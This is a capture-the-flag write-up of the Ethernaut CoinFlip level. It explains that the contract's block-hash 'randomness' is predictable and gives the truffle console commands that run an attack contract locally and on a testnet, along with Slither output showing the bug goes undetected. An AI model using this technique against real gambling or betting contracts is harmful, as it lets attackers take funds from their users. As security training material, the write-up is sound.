# CoinFlip

[CoinFlip](https://ethernaut.openzeppelin.com/level/0x9240670dbd6476e6a32055E52A0b0756abd26fd2)

This bug boils down to "randomness" that is generated deterministically.
Hence it is vulnerable to front-running.

<BR />


## Testing Attack

```BASH
truffle develop
```

```JS
migrate
attack = await CoinFlipAttack.deployed()

await attack.target()
await attack.flip({from: accounts[1]})
(await attack.fail()).toString()
(await attack.success()).toString()
```

<BR />

## Live Attack

```BASH
truffle console --network goerli
```


```JS
// Identify the account index
// 0xCbB9660eA60B895443ef5001B968b6Ae4c0AaA18
accounts
sender = accounts[5]

migrate

attack = await CoinFlipAttack.deployed()

await attack.target()
await attack.flip({from: sender})
(await attack.fail()).toString()
(await attack.success()).toString()

flip = await CoinFlip.at('0xA737b256ed909Fd726Ef5E59793fd9A60D516D23')
(await flip.consecutiveWins()).toString()
```

<BR />

## Vulnerability Testing Tools

This is a logical bug, so one can expect test tools not to catch it.

<BR />

### Slither

Not detected.

```BASH
slither ./contracts/CoinFlip.sol  --truffle-ignore-compile --exclude-optimization 
```

```
CoinFlip.flip(bool) (contracts/CoinFlip.sol#14-32) uses a dangerous strict equality:
        - lastHash == blockValue (contracts/CoinFlip.sol#17)
CoinFlip.flip(bool) (contracts/CoinFlip.sol#14-32) uses a dangerous strict equality:
        - coinFlip == 1 (contracts/CoinFlip.sol#23)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#dangerous-strict-equalities

Pragma version^0.8.0 (contracts/CoinFlip.sol#2) allows old versions
solc-0.8.9 is not recommended for deployment
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity

Parameter CoinFlip.flip(bool)._guess (contracts/CoinFlip.sol#14) is not in mixedCase
Variable CoinFlip.FACTOR (contracts/CoinFlip.sol#8) is not in mixedCase
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#conformance-to-solidity-naming-conventions
./contracts/CoinFlip.sol analyzed (1 contracts with 76 detectors), 6 result(s) found
```
